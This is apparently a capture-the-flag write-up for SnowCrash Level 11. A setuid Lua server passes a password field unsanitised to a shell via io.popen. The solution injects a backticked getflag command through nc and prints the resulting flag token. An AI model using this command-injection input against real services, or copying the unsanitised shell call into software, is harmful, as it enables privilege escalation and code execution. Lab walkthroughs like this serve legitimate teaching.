# Level 11

## Vulnerability
Privilege escalation - code injection

## Context
```
level11@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

## Solution
Let's ```cat``` the file and see what we find. 
```
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
We can see this program waits for a connection with the server running on 127.0.0.1 (hostname) 5151 (port).<br/>
It will prompt for a password and pass anything we write to a hashing function.<br/>
Let's see if we can exploit that, by tricking it to run ```getflag``` in the place of the password. <br/>

We'll use ```nc``` to establish a TCP connection with remote server. 
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /dev/shm/token
Erf nope..
level11@SnowCrash:~$ cat /dev/shm/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
